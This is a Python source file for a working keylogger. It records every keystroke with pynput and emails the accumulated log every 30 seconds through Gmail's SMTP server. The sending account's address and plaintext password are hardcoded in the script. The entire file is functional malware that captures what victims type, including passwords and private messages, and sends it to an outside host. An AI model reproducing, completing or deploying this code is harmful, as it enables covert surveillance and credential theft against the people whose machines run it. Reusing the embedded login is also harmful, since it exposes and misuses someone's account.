import pynput.keyboard
import smtplib
import threading

log = ""

def callback_function(key):
    global log
    try:
        log = log + str(key.char)
        #log = log + key.char.encode("utf-8")
    except AttributeError:
        if key==key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass
    print(log)

def sendEmail(email,password,message):
    emailServer = smtplib.SMTP("smtp.gmail.com",587)
    emailServer.starttls()
    emailServer.login(email,password)
    emailServer.sendmail(email,email,message)
    emailServer.quit()

def thread_function():
    global log
    sendEmail("cem80020@gmail.com","NaruTo013401",log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()

keyloogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keyloogger_listener:
    thread_function()
    keyloogger_listener.join()
